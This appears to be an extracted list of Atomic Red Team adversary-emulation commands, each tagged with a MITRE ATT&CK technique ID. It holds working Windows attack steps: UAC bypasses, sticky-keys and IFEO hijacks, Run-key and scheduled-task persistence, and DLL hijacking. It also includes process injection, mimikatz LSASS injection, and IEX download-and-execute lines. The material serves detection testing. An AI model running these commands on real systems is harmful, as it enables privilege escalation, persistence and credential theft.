1316: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [      $Name = "Debugger"]
1317: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [      $Value = "#{attached_process}"]
1318: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [      Foreach ($item in $input_table){]
1319: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        $item = $item.trim()]
1320: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"]
1321: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        IF(!(Test-Path $registryPath))]
1322: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        {]
1323: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [          New-Item -Path $registryPath -Force]
1324: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [          New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force]
1325: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        }]
1326: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        ELSE]
1327: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        {]
1328: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [          New-ItemProperty -Path $registryPath -Name $name -Value $Value]
1329: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        }]
1330: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [      }]
1340: [- name: Replace binary of sticky keys] [attack_technique: T1546.008] [    command: |]
1341: [- name: Replace binary of sticky keys] [attack_technique: T1546.008] [      copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe]
1342: [- name: Replace binary of sticky keys] [attack_technique: T1546.008] [      takeown /F C:\Windows\System32\sethc.exe /A]
1343: [- name: Replace binary of sticky keys] [attack_technique: T1546.008] [      icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t]
1344: [- name: Replace binary of sticky keys] [attack_technique: T1546.008] [      copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe]
1349: [- name: Install AppInit Shim] [attack_technique: T1546.010] [    command: |]
1350: [- name: Install AppInit Shim] [attack_technique: T1546.010] [      reg.exe import #{registry_file}]
1355: [- name: Application Shim Installation] [attack_technique: T1546.011] [    command: |]
1356: [- name: Application Shim Installation] [attack_technique: T1546.011] [      sdbinst.exe #{file_path}]
1361: [- name: New shim database files created in the default shim database directory] [attack_technique: T1546.011] [    command: |]
1362: [- name: New shim database files created in the default shim database directory] [attack_technique: T1546.011] [      Copy-Item $PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb]
1363: [- name: New shim database files created in the default shim database directory] [attack_technique: T1546.011] [      Copy-Item $PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb]
1369: [- name: Registry key creation and/or modification events for SDB] [attack_technique: T1546.011] [    command: |]
1370: [- name: Registry key creation and/or modification events for SDB] [attack_technique: T1546.011] [      New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"]
1371: [- name: Registry key creation and/or modification events for SDB] [attack_technique: T1546.011] [      New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"]
1377: [- name: Process Injection via C#] [attack_technique: T1055.004] [    command: |]
1378: [- name: Process Injection via C#] [attack_technique: T1055.004] [      #{exe_binary}]
1381: [- name: Authentication Package] [attack_technique: T1547.002] [    command: |]
1382: [- name: Authentication Package] [attack_technique: T1547.002] [      Copy-Item $PathToAtomicsFolder\T1547.002\bin\package.dll C:\Windows\System32\]
1383: [- name: Authentication Package] [attack_technique: T1547.002] [      reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f]
1389: [- name: Add a driver] [attack_technique: T1547] [    command: |]
1390: [- name: Add a driver] [attack_technique: T1547] [      pnputil.exe /add-driver "#{driver_inf}"]
1393: [- name: Bypass UAC using Event Viewer (cmd)] [attack_technique: T1548.002] [    command: |]
1394: [- name: Bypass UAC using Event Viewer (cmd)] [attack_technique: T1548.002] [      reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f]
1395: [- name: Bypass UAC using Event Viewer (cmd)] [attack_technique: T1548.002] [      cmd.exe /c eventvwr.msc]
1400: [- name: Bypass UAC using Event Viewer (PowerShell)] [attack_technique: T1548.002] [    command: |]
1401: [- name: Bypass UAC using Event Viewer (PowerShell)] [attack_technique: T1548.002] [      New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force]
1402: [- name: Bypass UAC using Event Viewer (PowerShell)] [attack_technique: T1548.002] [      Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force]
1403: [- name: Bypass UAC using Event Viewer (PowerShell)] [attack_technique: T1548.002] [      Start-Process "C:\Windows\System32\eventvwr.msc"]
1408: [- name: Bypass UAC using Fodhelper] [attack_technique: T1548.002] [    command: |]
1409: [- name: Bypass UAC using Fodhelper] [attack_technique: T1548.002] [      reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f]
1410: [- name: Bypass UAC using Fodhelper] [attack_technique: T1548.002] [      reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f]
1411: [- name: Bypass UAC using Fodhelper] [attack_technique: T1548.002] [      fodhelper.exe]
1416: [- name: Bypass UAC using Fodhelper - PowerShell] [attack_technique: T1548.002] [    command: |]
1417: [- name: Bypass UAC using Fodhelper - PowerShell] [attack_technique: T1548.002] [      New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force]
1418: [- name: Bypass UAC using Fodhelper - PowerShell] [attack_technique: T1548.002] [      New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force]
1419: [- name: Bypass UAC using Fodhelper - PowerShell] [attack_technique: T1548.002] [      Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force]
1420: [- name: Bypass UAC using Fodhelper - PowerShell] [attack_technique: T1548.002] [      Start-Process "C:\Windows\System32\fodhelper.exe"]
1425: [- name: Bypass UAC using ComputerDefaults (PowerShell)] [attack_technique: T1548.002] [    command: |]
1426: [- name: Bypass UAC using ComputerDefaults (PowerShell)] [attack_technique: T1548.002] [      New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force]
1427: [- name: Bypass UAC using ComputerDefaults (PowerShell)] [attack_technique: T1548.002] [      New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force]
1428: [- name: Bypass UAC using ComputerDefaults (PowerShell)] [attack_technique: T1548.002] [      Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force]
1429: [- name: Bypass UAC using ComputerDefaults (PowerShell)] [attack_technique: T1548.002] [      Start-Process "C:\Windows\System32\ComputerDefaults.exe"]
1434: [- name: Bypass UAC by Mocking Trusted Directories] [attack_technique: T1548.002] [    command: |]
1435: [- name: Bypass UAC by Mocking Trusted Directories] [attack_technique: T1548.002] [      mkdir "\\?\C:\Windows \System32\"]
1436: [- name: Bypass UAC by Mocking Trusted Directories] [attack_technique: T1548.002] [      copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"]
1437: [- name: Bypass UAC by Mocking Trusted Directories] [attack_technique: T1548.002] [      mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"]
1443: [- name: Bypass UAC using sdclt DelegateExecute] [attack_technique: T1548.002] [    command: |]
1444: [- name: Bypass UAC using sdclt DelegateExecute] [attack_technique: T1548.002] [      New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command.to.execute}']
1445: [- name: Bypass UAC using sdclt DelegateExecute] [attack_technique: T1548.002] [      New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"]
1446: [- name: Bypass UAC using sdclt DelegateExecute] [attack_technique: T1548.002] [      Start-Process -FilePath $env:windir\system32\sdclt.exe]
1447: [- name: Bypass UAC using sdclt DelegateExecute] [attack_technique: T1548.002] [      Start-Sleep -s 3]
1452: [- name: Disable UAC using reg.exe] [attack_technique: T1548.002] [    command: |]
1453: [- name: Disable UAC using reg.exe] [attack_technique: T1548.002] [      reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f]
1458: [- name: Bypass UAC using SilentCleanup task] [attack_technique: T1548.002] [    command: |]
1459: [- name: Bypass UAC using SilentCleanup task] [attack_technique: T1548.002] [      #{file_path}]
1462: [- name: UACME Bypass Method 23] [attack_technique: T1548.002] [    command: |]
1463: [- name: UACME Bypass Method 23] [attack_technique: T1548.002] [      "#{uacme_exe}"]
1469: [- name: UACME Bypass Method 31] [attack_technique: T1548.002] [    command: |]
1470: [- name: UACME Bypass Method 31] [attack_technique: T1548.002] [      "#{uacme_exe}"]
1476: [- name: UACME Bypass Method 33] [attack_technique: T1548.002] [    command: |]
1477: [- name: UACME Bypass Method 33] [attack_technique: T1548.002] [      "#{uacme_exe}"]
1483: [- name: UACME Bypass Method 34] [attack_technique: T1548.002] [    command: |]
1484: [- name: UACME Bypass Method 34] [attack_technique: T1548.002] [      "#{uacme_exe}"]
1490: [- name: UACME Bypass Method 39] [attack_technique: T1548.002] [    command: |]
1491: [- name: UACME Bypass Method 39] [attack_technique: T1548.002] [      "#{uacme_exe}"]
1497: [- name: UACME Bypass Method 56] [attack_technique: T1548.002] [    command: |]
1498: [- name: UACME Bypass Method 56] [attack_technique: T1548.002] [      "#{uacme_exe}"]
1504: [- name: UACME Bypass Method 59] [attack_technique: T1548.002] [    command: |]
1505: [- name: UACME Bypass Method 59] [attack_technique: T1548.002] [      "#{uacme_exe}"]
1511: [- name: UACME Bypass Method 61] [attack_technique: T1548.002] [    command: |]
1512: [- name: UACME Bypass Method 61] [attack_technique: T1548.002] [      "#{uacme_exe}"]
1540: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [    command: |]
1541: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan]
1542: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value #{file_name} -Force | Out-Null]
1543: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null]
1544: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null]
1545: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null]
1546: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      Write-Host "executing eventvwr.msc" -ForegroundColor Cyan]
1547: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      START MMC.EXE EVENTVWR.MSC]
1555: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [    command: |]
1556: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      Write-Host "Creating system environment variables" -ForegroundColor Cyan]
1557: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null]
1558: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null]
1559: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null]
1566: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [    command: |]
1567: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      $env:COR_ENABLE_PROFILING = 1]
1568: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      $env:COR_PROFILER = '#{clsid_guid}']
1569: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      $env:COR_PROFILER_PATH = '#{file_name}']
1570: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      POWERSHELL -c 'Start-Sleep 1']
1577: [- name: Change Default File Association] [attack_technique: T1546.001] [    command: |]
1578: [- name: Change Default File Association] [attack_technique: T1546.001] [      assoc #{extension_to_change}=#{target_extension_handler}]
1593: [- name: Powershell Execute COM Object] [attack_technique: T1546.015] [    command: |]
1594: [- name: Powershell Execute COM Object] [attack_technique: T1546.015] [      $o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))]
1595: [- name: Powershell Execute COM Object] [attack_technique: T1546.015] [      $item = $o.Item()]
1596: [- name: Powershell Execute COM Object] [attack_technique: T1546.015] [      $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)]
1613: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [    command: |]
1614: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [      copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe]
1615: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [      copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll]
1616: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [      %APPDATA%\updater.exe -Command exit]
1622: [- name: DLL Side-Loading using the Notepad++ GUP.exe binary] [attack_technique: T1574.002] [    command: |]
1623: [- name: DLL Side-Loading using the Notepad++ GUP.exe binary] [attack_technique: T1574.002] [      #{gup_executable}]
1644: [- name: Activate Guest Account] [attack_technique: T1078.001] [    command: |]
1645: [- name: Activate Guest Account] [attack_technique: T1078.001] [     net user #{guest_user} /active:yes]
1650: [- name: Process Injection via mavinject.exe] [attack_technique: T1055.001] [    command: |]
1651: [- name: Process Injection via mavinject.exe] [attack_technique: T1055.001] [      $mypid = #{process_id}]
1652: [- name: Process Injection via mavinject.exe] [attack_technique: T1055.001] [      mavinject $mypid /INJECTRUNNING #{dll_payload}]
1653: [- name: Process Injection via mavinject.exe] [attack_technique: T1055.001] [      Stop-Process -processname notepad]
1660: [- name: IFEO Add Debugger] [attack_technique: T1546.012] [    command: |]
1661: [- name: IFEO Add Debugger] [attack_technique: T1546.012] [      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"]
1666: [- name: IFEO Global Flags] [attack_technique: T1546.012] [    command: |]
1667: [- name: IFEO Global Flags] [attack_technique: T1546.012] [      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512]
1668: [- name: IFEO Global Flags] [attack_technique: T1546.012] [      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1]
1669: [- name: IFEO Global Flags] [attack_technique: T1546.012] [      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"]
1697: [- name: Netsh Helper DLL Registration] [attack_technique: T1546.007] [    command: |]
1698: [- name: Netsh Helper DLL Registration] [attack_technique: T1546.007] [      netsh.exe add helper #{helper_file}]
1701: [- name: Parent PID Spoofing using PowerShell] [attack_technique: T1134.004] [    command: |]
1702: [- name: Parent PID Spoofing using PowerShell] [attack_technique: T1134.004] [      . $PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1]
1703: [- name: Parent PID Spoofing using PowerShell] [attack_technique: T1134.004] [      $ppid=Get-Process #{parent_process_name} | select -expand id]
1704: [- name: Parent PID Spoofing using PowerShell] [attack_technique: T1134.004] [      PPID-Spoof -ppid $ppid -spawnto "#{spawnto_process_path}" -dllpath "#{dll_path}"]
1710: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [    command: |]
1711: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      copy #{service_executable} "C:\Program Files\windows_service.exe"]
1712: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      copy #{service_executable} "C:\program.exe"]
1713: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto]
1714: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      sc start "Example Service"]
1723: [- name: Add Port Monitor persistence in Registry] [attack_technique: T1547.010] [    command: |]
1724: [- name: Add Port Monitor persistence in Registry] [attack_technique: T1547.010] [      reg add "hklm\system\currentcontrolset\control\print\monitors\ART" /v "Atomic Red Team" /d "#{monitor_dll}" /t REG_SZ]
1729: [- name: Append malicious start-process cmdlet] [attack_technique: T1546.013] [    command: |]
1730: [- name: Append malicious start-process cmdlet] [attack_technique: T1546.013] [      Add-Content #{ps_profile} -Value ""]
1731: [- name: Append malicious start-process cmdlet] [attack_technique: T1546.013] [      Add-Content #{ps_profile} -Value "Start-Process #{exe_path}"]
1732: [- name: Append malicious start-process cmdlet] [attack_technique: T1546.013] [      powershell -Command exit]
1738: [- name: Process Hollowing using PowerShell] [attack_technique: T1055.012] [    command: |]
1739: [- name: Process Hollowing using PowerShell] [attack_technique: T1055.012] [      . $PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1]
1740: [- name: Process Hollowing using PowerShell] [attack_technique: T1055.012] [      $ppid=Get-Process #{parent_process_name} | select -expand id]
1741: [- name: Process Hollowing using PowerShell] [attack_technique: T1055.012] [      Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose]
1746: [- name: RunPE via VBA] [attack_technique: T1055.012] [    command: |]
1747: [- name: RunPE via VBA] [attack_technique: T1055.012] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
1748: [- name: RunPE via VBA] [attack_technique: T1055.012] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) ]
1749: [- name: RunPE via VBA] [attack_technique: T1055.012] [      Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "#{ms_product}" -sub "Exploit"]
1752: [- name: Shellcode execution via VBA] [attack_technique: T1055] [    command: |]
1753: [- name: Shellcode execution via VBA] [attack_technique: T1055] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
1754: [- name: Shellcode execution via VBA] [attack_technique: T1055] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
1755: [- name: Shellcode execution via VBA] [attack_technique: T1055] [      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"]
1758: [- name: Remote Process Injection in LSASS via mimikatz] [attack_technique: T1055] [    command: |]
1759: [- name: Remote Process Injection in LSASS via mimikatz] [attack_technique: T1055] [      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"]
1762: [- name: Reg Key Run] [attack_technique: T1547.001] [    command: |]
1763: [- name: Reg Key Run] [attack_technique: T1547.001] [      REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"]
1768: [- name: Reg Key RunOnce] [attack_technique: T1547.001] [    command: |]
1769: [- name: Reg Key RunOnce] [attack_technique: T1547.001] [      REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"]
1774: [- name: PowerShell Registry RunOnce] [attack_technique: T1547.001] [    command: |]
1775: [- name: PowerShell Registry RunOnce] [attack_technique: T1547.001] [      $RunOnceKey = "#{reg_key_path}"]
1776: [- name: PowerShell Registry RunOnce] [attack_technique: T1547.001] [      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"']
1781: [- name: Suspicious vbs file run from startup Folder] [attack_technique: T1547.001] [    command: |]
1782: [- name: Suspicious vbs file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"]
1783: [- name: Suspicious vbs file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"]
1784: [- name: Suspicious vbs file run from startup Folder] [attack_technique: T1547.001] [      cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"]
1785: [- name: Suspicious vbs file run from startup Folder] [attack_technique: T1547.001] [      cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"]
1791: [- name: Suspicious jse file run from startup Folder] [attack_technique: T1547.001] [    command: |]
1792: [- name: Suspicious jse file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"]
1793: [- name: Suspicious jse file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"]
1794: [- name: Suspicious jse file run from startup Folder] [attack_technique: T1547.001] [      cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"]
1795: [- name: Suspicious jse file run from startup Folder] [attack_technique: T1547.001] [      cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"]
1801: [- name: Suspicious bat file run from startup Folder] [attack_technique: T1547.001] [    command: |]
1802: [- name: Suspicious bat file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"]
1803: [- name: Suspicious bat file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"]
1804: [- name: Suspicious bat file run from startup Folder] [attack_technique: T1547.001] [      Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"]
1805: [- name: Suspicious bat file run from startup Folder] [attack_technique: T1547.001] [      Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"]
1821: [- name: SystemBC Malware-as-a-Service Registry] [attack_technique: T1547.001] [    command: |]
1822: [- name: SystemBC Malware-as-a-Service Registry] [attack_technique: T1547.001] [      $RunKey = "#{reg_key_path}"]
1823: [- name: SystemBC Malware-as-a-Service Registry] [attack_technique: T1547.001] [      Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "#{reg_key_value}"]
1828: [- name: Scheduled Task Startup Script] [attack_technique: T1053.005] [    command: |]
1829: [- name: Scheduled Task Startup Script] [attack_technique: T1053.005] [      schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"]
1830: [- name: Scheduled Task Startup Script] [attack_technique: T1053.005] [      schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"]
1836: [- name: Scheduled task Remote] [attack_technique: T1053.005] [    command: |]
1837: [- name: Scheduled task Remote] [attack_technique: T1053.005] [      SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}]
1865: [- name: Powershell Cmdlet Scheduled Task] [attack_technique: T1053.005] [    command: |]
1866: [- name: Powershell Cmdlet Scheduled Task] [attack_technique: T1053.005] [      SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}]
1874: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [    command: |]
1875: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $Action = New-ScheduledTaskAction -Execute "calc.exe"]
1876: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $Trigger = New-ScheduledTaskTrigger -AtLogon]
1877: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest]
1878: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $Set = New-ScheduledTaskSettingsSet]
1879: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set]
1880: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      Register-ScheduledTask AtomicTask -InputObject $object]
1903: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [    command: |]
1904: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
1905: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) ]
1906: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"]
1909: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [    command: |]
1910: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")]
1911: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }]
1927: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [    command: |]
1928: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f]
1929: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}]
1935: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [    command: |]
1936: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"]
1937: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f]
1938: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f]
